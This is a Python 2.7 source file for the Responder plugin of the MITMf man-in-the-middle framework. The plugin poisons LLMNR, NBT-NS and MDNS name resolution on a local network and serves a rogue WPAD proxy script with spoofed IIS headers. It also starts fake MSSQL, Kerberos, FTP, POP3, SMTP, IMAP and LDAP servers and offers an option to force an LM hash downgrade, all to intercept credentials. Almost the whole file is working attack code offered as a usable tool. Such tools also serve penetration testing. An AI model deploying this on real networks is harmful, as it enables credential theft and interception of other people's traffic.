#!/usr/bin/env python2.7

# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#
import flask

from plugins.plugin import Plugin
from twisted.internet import reactor

class Responder(Plugin):
    name        = "Responder"
    optname     = "responder"
    desc        = "Poison LLMNR, NBT-NS and MDNS requests"
    tree_info   = ["NBT-NS, LLMNR & MDNS Responder v2.1.2 by Laurent Gaffie online"]
    version     = "0.2"

    def initialize(self, options):
        '''Called if plugin is enabled, passed the options namespace'''
        self.options   = options
        self.interface = options.interface
        self.ip        = options.ip

        try:
            config = self.config['Responder']
            smbChal = self.config['MITMf']['SMB']['Challenge']
        except Exception as e:
            shutdown('[-] Error parsing config for Responder: ' + str(e))

        from core.responder.llmnr.LLMNRpoisoner import LLMNRpoisoner
        from core.responder.mdns.MDNSpoisoner import MDNSpoisoner
        from core.responder.nbtns.NBTNSpoisoner import NBTNSpoisoner
        from core.responder.fingerprinter.LANfingerprinter import LANfingerprinter

        LANfingerprinter().start(options)
        MDNSpoisoner().start(options, options.ip)
        NBTNSpoisoner().start(options, options.ip)
        LLMNRpoisoner().start(options, options.ip)

        if options.wpad:
            from core.servers.http.HTTPserver import HTTPserver
            def wpad_request(path):
                if (path == 'wpad.dat') or (path.endswith('.pac')):
                    payload = self.config['Responder']['WPADScript']
                    
                    resp = flask.Response(payload)
                    resp.headers['Server'] = "Microsoft-IIS/6.0"
                    resp.headers['Content-Type'] = "application/x-ns-proxy-autoconfig"
                    resp.headers['X-Powered-By'] = "ASP.NET"
                    resp.headers['Content-Length'] = len(payload)

                    return resp

            HTTPserver().add_endpoint(wpad_request)

        if self.config["Responder"]["MSSQL"].lower() == "on":
            from core.responder.mssql.MSSQLserver import MSSQLserver
            MSSQLserver().start(smbChal)

        if self.config["Responder"]["Kerberos"].lower() == "on":
            from core.responder.kerberos.KERBserver import KERBserver
            KERBserver().start()

        if self.config["Responder"]["FTP"].lower() == "on":
            from core.responder.ftp.FTPserver import FTPserver
            FTPserver().start()

        if self.config["Responder"]["POP"].lower() == "on":
            from core.responder.pop3.POP3server import POP3server
            POP3server().start()

        if self.config["Responder"]["SMTP"].lower() == "on":
            from core.responder.smtp.SMTPserver import SMTPserver
            SMTPserver().start()

        if self.config["Responder"]["IMAP"].lower() == "on":
            from core.responder.imap.IMAPserver import IMAPserver
            IMAPserver().start()

        if self.config["Responder"]["LDAP"].lower() == "on":
            from core.responder.ldap.LDAPserver import LDAPserver
            LDAPserver().start(smbChal)

        if options.analyze:
            self.tree_info.append("Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned")
            self.IsICMPRedirectPlausible(options.ip)
    
    def IsICMPRedirectPlausible(self, IP):
        result = []
        dnsip = []
        for line in file('/etc/resolv.conf', 'r'): 
            ip = line.split()
            if len(ip) < 2:
               continue
            if ip[0] == 'nameserver':
                dnsip.extend(ip[1:])
        
        for x in dnsip:
            if x !="127.0.0.1" and self.IsOnTheSameSubnet(x,IP) == False:
                self.tree_info.append("You can ICMP Redirect on this network. This workstation ({}) is not on the same subnet than the DNS server ({})".format(IP, x))
            else:
                pass

    def IsOnTheSameSubnet(self, ip, net):
        net = net+'/24'
        ipaddr = int(''.join([ '%02x' % int(x) for x in ip.split('.') ]), 16)
        netstr, bits = net.split('/')
        netaddr = int(''.join([ '%02x' % int(x) for x in netstr.split('.') ]), 16)
        mask = (0xffffffff << (32 - int(bits))) & 0xffffffff
        return (ipaddr & mask) == (netaddr & mask)

    def reactor(self, strippingFactory):
        reactor.listenTCP(3141, strippingFactory)

    def options(self, options):
        options.add_argument('--analyze', dest="analyze", action="store_true", help="Allows you to see NBT-NS, BROWSER, LLMNR requests without poisoning")
        options.add_argument('--wredir', dest="wredir", default=False, action="store_true", help="Enables answers for netbios wredir suffix queries")
        options.add_argument('--nbtns', dest="nbtns", default=False, action="store_true", help="Enables answers for netbios domain suffix queries")
        options.add_argument('--fingerprint', dest="finger", default=False, action="store_true", help = "Fingerprint hosts that issued an NBT-NS or LLMNR query")
        options.add_argument('--lm', dest="lm", default=False, action="store_true", help="Force LM hashing downgrade for Windows XP/2003 and earlier")
        options.add_argument('--wpad', dest="wpad", default=False, action="store_true", help = "Start the WPAD rogue proxy server")
        # Removed these options until I find a better way of implementing them
        #options.add_argument('--forcewpadauth', dest="forceWpadAuth", default=False, action="store_true", help = "Set this if you want to force NTLM/Basic authentication on wpad.dat file retrieval. This might cause a login prompt in some specific cases. Therefore, default value is False")
        #options.add_argument('--basic', dest="basic", default=False, action="store_true", help="Set this if you want to return a Basic HTTP authentication. If not set, an NTLM authentication will be returned")
